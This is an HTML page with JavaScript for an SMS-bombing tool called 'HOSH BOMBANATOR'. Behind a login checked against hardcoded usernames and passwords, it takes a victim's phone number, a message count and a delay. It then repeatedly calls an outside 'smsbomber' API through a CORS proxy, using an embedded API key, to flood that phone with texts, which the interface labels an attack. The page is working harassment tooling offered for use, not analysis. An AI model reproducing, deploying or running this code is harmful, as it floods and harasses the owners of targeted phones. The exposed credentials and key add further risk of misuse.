<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>HOSH BOMBANATOR</title>
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', sans-serif;
      background-color: #0d0d0d; /* Dark background */
      color: #ffffff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      flex-direction: column;
      overflow: hidden;
      transform: scale(0.8); /* Scale down to 80% */
      transform-origin: top; /* Keep the top of the page fixed */
      animation: fadeIn 0.5s ease-in-out; /* Fade-in animation */
    }

    @keyframes fadeIn {
      from { opacity: 0; }
      to { opacity: 1; }
    }

    .header {
      position: absolute;
      top: 20px;
      left: 20px;
      display: flex;
      align-items: center;
      animation: slideIn 0.5s ease-in-out; /* Slide-in animation */
    }

    @keyframes slideIn {
      from { transform: translateY(-20px); opacity: 0; }
      to { transform: translateY(0); opacity: 1; }
    }

    .social-icon {
      width: 40px;
      height: 40px;
      margin-right: 10px;
      transition: transform 0.3s;
    }

    .social-links {
      color: #d000ff;
      text-decoration: none;
      font-weight: bold;
      margin-right: 15px;
      transition: color 0.3s;
    }

    .social-links:hover {
      color: #9d00c6;
    }

    .card {
      background: #2c2c2c;
      padding: 20px;
      border-radius: 12px;
      box-shadow: 0 0 20px #d000ff;
      text-align: center;
      width: 90%;
      max-width: 400px;
      margin-bottom: 20px;
      animation: popIn 0.5s ease-in-out; /* Pop-in animation */
    }

    @keyframes popIn {
      from { transform: scale(0.8); opacity: 0; }
      to { transform: scale(1); opacity: 1; }
    }

    h1 {
      margin-top: 0;
      font-weight: bold;
      animation: move 2s infinite alternate; /* Moving animation */
      color: #d000ff; /* Neon color */
    }

    @keyframes move {
      0% { transform: translateY(0); }
      100% { transform: translateY(-10px); }
    }

    input {
      display: block;
      margin: 12px auto;
      padding: 12px;
      width: 90%;
      background: #3d3d3d;
      border: 1px solid #d000ff;
      border-radius: 6px;
      color: #ffffff;
      font-size: 16px;
      font-weight: bold;
      transition: border-color 0.3s;
    }

    input:focus {
      border-color: #9d00c6;
      outline: none;
    }

    button {
      padding: 10px 20px;
      background: #d000ff;
      border: none;
      color: #ffffff;
      font-weight: bold;
      border-radius: 6px;
      cursor: pointer;
      font-size: 16px;
      margin-top: 10px;
      width: 90%;
      box-shadow: 0 0 10px #d000ff;
      transition: background 0.3s, transform 0.3s;
    }

    button:hover {
      background: #9d00c6;
      transform: scale(1.05);
    }

    .log {
      margin-top: 20px;
      height: 200px;
      overflow-y: auto;
      background: #000e1c;
      border-radius: 6px;
      padding: 10px;
      text-align: left;
      font-size: 14px;
      border: 1px solid #d000ff;
    }

    .log-entry {
      margin: 4px 0;
      font-family: monospace;
      color: #b76aff;
      font-weight: bold;
    }

    .certified-link {
      display: none; /* Hide the valid users link */
    }

    .timer {
      margin-top: 10px;
      font-size: 15px;
      color: #d000ff;
      font-weight: bold;
    }

    #loginMessage {
      margin-top: 10px;
      font-size: 13px;
      color: #ff66ff;
      font-weight: bold;
    }

    .admin-buttons {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
    }

    .modal {
      display: none;
      position: fixed;
      z-index: 1000;
      left: 0;
      top: 0;
      width: 100%;
      height: 100%;
      overflow: auto;
      background-color: rgba(0, 0, 0, 0.7);
      padding-top: 60px;
    }

    .modal-content {
      background-color: #2c2c2c;
      margin: 5% auto;
      padding: 20px;
      border: 1px solid #d000ff;
      width: 80%;
      max-width: 300px;
      border-radius: 10px;
      text-align: center;
    }

    .modal-button {
      background: #d000ff;
      border: none;
      color: white;
      padding: 10px 20px;
      margin: 5px;
      border-radius: 5px;
      cursor: pointer;
      box-shadow: 0 0 10px #d000ff;
    }

    .modal-button:hover {
      background: #9d00c6;
    }
  </style>
</head>
<body>
  <div class="header">
    <a href="https://facebook.com/share/1CDdYCx5T9/" target="_blank">
      <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook" class="social-icon" />
    </a>
  </div>

  <div id="login-section" class="card">
    <h2>Login</h2>
    <input type="text" id="username" placeholder="üë§ Name" />
    <div style="position: relative;">
      <input type="password" id="password" placeholder="üîí Password" />
      <span onclick="togglePassword()" style="position: absolute; right: 25px; top: 14px; cursor: pointer; color: #d000ff;">üëÅÔ∏è</span>
    </div>
    <button onclick="login()">Login</button>
    <div id="loginMessage" class="log-entry"></div>
    <div class="certified-link" onclick="showValidUsers()">üîé Valid Users</div>
  </div>

  <div id="main-section" class="card" style="display: none;">
    <h1>HOSH BOMBANATOR</h1>
    <input id="number" placeholder="üì± Phone Number" />
    <input id="count" type="number" placeholder="üîÅ How many messages?" />
    <input id="delay" type="number" placeholder="‚è±Ô∏è Delay (seconds)" />
    <div class="admin-buttons">
      <button onclick="startSimulation()">START</button>
      <button onclick="saveLogs()" style="display: none;" id="saveLogsButton">Save Logs</button>
    </div>
    <div class="timer" id="timerDisplay"></div>
    <div class="log" id="logBox"></div>
  </div>

  <!-- Modal -->
  <div id="leaveModal" class="modal">
    <div class="modal-content">
      <h3>Do you want to leave?</h3>
      <button class="modal-button" id="leaveButton">Leave</button>
      <button class="modal-button" id="continueButton">Continue</button>
    </div>
  </div>

  <script>
    const certifiedUsers = [
      { name: "Admin", pass: "Bomva" },
      { name: "BomberX769", pass: "HBomberX9v48c" },
      { name: "BomberX314", pass: "HBomberXa73kd" },
      { name: "BomberX582", pass: "HBomberX4m92q" },
      { name: "BomberX907", pass: "HBomberXc18z7" },
      { name: "BomberX126", pass: "HBomberXq57vx" },
      { name: "BomberX843", pass: "HBomberX9k4t2" },
      { name: "BomberX251", pass: "HBomberXb62f9" },
      { name: "BomberX678", pass: "HBomberX7n3xq" },
      { name: "BomberX490", pass: "HBomberXk49w8" },
      { name: "BomberX325", pass: "HBomberX2d8m5" }
    ];

    const blockedNumbers = [
      "09063556308" // Blocked number
    ];

    let currentUser         = "";
    let cooldownActive = false;
    let cooldownTimer;
    let remainingCooldownTime = 0;
    let isAttacking = false;
    let logs = [];

    function togglePassword() {
      const pw = document.getElementById("password");
      pw.type = pw.type === "password" ? "text" : "password";
    }

    function login() {
      const inputName = document.getElementById("username").value.trim();
      const inputPass = document.getElementById("password").value.trim();
      const loginMessage = document.getElementById("loginMessage");

      const found = certifiedUsers.find(
        u => u.name.toLowerCase() === inputName.toLowerCase() && u.pass === inputPass
      );

      if (!found) {
        loginMessage.textContent = "‚ùå Invalid credentials.";
        return;
      }

      loginMessage.textContent = "";
      currentUser         = found.name;
      document.getElementById("login-section").style.display = "none";
      document.getElementById("main-section").style.display = "block";
      logAction(`${currentUser        } logged in.`);

      if (cooldownActive && currentUser         !== "Admin") {
        displayCooldownMessage();
      }

      if (currentUser         === "Admin") {
        document.getElementById("saveLogsButton").style.display = "block";
      }
    }

    function startSimulation() {
      let number = document.getElementById("number").value.trim();
      const count = parseInt(document.getElementById("count").value.trim());
      const delay = parseFloat(document.getElementById("delay").value.trim()) || 1.5;
      const logBox = document.getElementById("logBox");
      const timerDisplay = document.getElementById("timerDisplay");

      if (number.length === 10 && number.startsWith("9")) {
        number = "0" + number;
        document.getElementById("number").value = number;
      }

      // Check if the number is blocked
      if (blockedNumbers.includes(number)) {
        logBox.innerHTML = "<div class='log-entry' style='color: orange;'>‚ö†Ô∏è This number is blocked from bombing.</div>";
        return;
      }

      if (!/^09\d{9}$/.test(number) || isNaN(count) || count <= 0 || isNaN(delay)) {
        logBox.innerHTML = "<div class='log-entry' style='color: orange;'>‚ö†Ô∏è Invalid phone number, count, or delay.</div>";
        return;
      }

      // Remove the message limit for Admin
      if (currentUser       !== "Admin" && count > 50) {
        logBox.innerHTML = "<div class='log-entry' style='color: orange;'>‚ö†Ô∏è Maximum number of messages is 50.</div>";
        return;
      }

      logBox.innerHTML = "";
      timerDisplay.textContent = "üöÄ Starting Attack...";
      isAttacking = true;

      let completed = 0;

      for (let i = 1; i <= count; i++) {
        setTimeout(() => {
          const url = `https://corsproxy.io/?https://haji-mix-api.gleeze.com/api/smsbomber?phone=${encodeURIComponent(number)}&amount=1&api_key=b7803e277f88d59c3ee050bd866aa2eeaa1a6100bf60a8bca9474b886fceb9d8`;

          fetch(url)
            .then(res => res.json())
            .then(data => {
              const result = data.message || "SMS bombing completed.";
              const log = document.createElement("div");
              log.className = "log-entry";
              log.textContent = `${i.toString().padStart(2, '0')} ‚úÖ Sent to ${number}: ${result}`;
              logBox.appendChild(log);
              logBox.scrollTop = logBox.scrollHeight;
              logAction(`${currentUser      } sent ${count} SMS to ${number}.`);

              completed++;
              if (completed === count) {
                timerDisplay.textContent = "‚úÖ Attack Finished.";
                isAttacking = false;

                // Set cooldown for non-admin users after attack is finished
                if (currentUser       !== "Admin") {
                  cooldownActive = true;
                  remainingCooldownTime = 180;
                  displayCooldownMessage();
                }
              }
            })
            .catch(error => {
              const log = document.createElement("div");
              log.className = "log-entry";
              log.style.color = "red";
              log.textContent = `${i.toString().padStart(2, '0')} ‚ùå Error: ${error.message}`;
              logBox.appendChild(log);
              logBox.scrollTop = logBox.scrollHeight;

              completed++;
              if (completed === count) {
                timerDisplay.textContent = "‚úÖ Attack Finished.";
                isAttacking = false;

                // Set cooldown for non-admin users after attack is finished
                if (currentUser       !== "Admin") {
                  cooldownActive = true;
                  remainingCooldownTime = 180;
                  displayCooldownMessage();
                }
              }
            });
        }, i * delay * 1000);
      }
    }

    function displayCooldownMessage() {
      const logBox = document.getElementById("logBox");
      const cooldownDisplay = document.createElement("div");
      cooldownDisplay.className = "log-entry";
      cooldownDisplay.style.color = "orange";
      cooldownDisplay.textContent = `Cooldown active for ${remainingCooldownTime} seconds.`;
      logBox.appendChild(cooldownDisplay);
      logBox.scrollTop = logBox.scrollHeight;

      if (remainingCooldownTime > 0) {
        cooldownTimer = setInterval(() => {
          remainingCooldownTime--;
          cooldownDisplay.textContent = `Cooldown active for ${remainingCooldownTime} seconds.`;
          if (remainingCooldownTime <= 0) {
            clearInterval(cooldownTimer);
            cooldownActive = false;
            cooldownDisplay.textContent = "Cooldown finished. You can send messages now.";
          }
        }, 1000);
      }
    }

    function logAction(action) {
      const now = new Date();
      const timestamp = now.toLocaleString();
      logs.push(`${timestamp}: ${action}`);
    }

    function saveLogs() {
      const now = new Date();
      const filename = `${now.getDate()}-${now.getMonth() + 1}-${now.getFullYear()} [${now.getHours()}:${now.getMinutes()}].txt`;
      const blob = new Blob([logs.join('\n')], { type: 'text/plain' });
      const link = document.createElement('a');
      link.href = URL.createObjectURL(blob);
      link.download = filename;
      link.click();
      logs = [];
      alert("Logs saved successfully!");
    }

    window.onbeforeunload = function () {
      if (isAttacking) {
        showLeaveModal();
        return false;
      }
    };

    function showLeaveModal() {
      const modal = document.getElementById("leaveModal");
      modal.style.display = "block";

      document.getElementById("leaveButton").onclick = function () {
        alert("Leaving right now will suspend your account for 1 day. Please contact the admin to unsuspend.");
        window.location.href = "login.html";
      };

      document.getElementById("continueButton").onclick = function () {
        modal.style.display = "none";
      };
    }

    document.getElementById("main-section").addEventListener("click", function (event) {
      if (event.target === this) {
        showLeaveModal();
      }
    });
  </script>
</body>
</html>
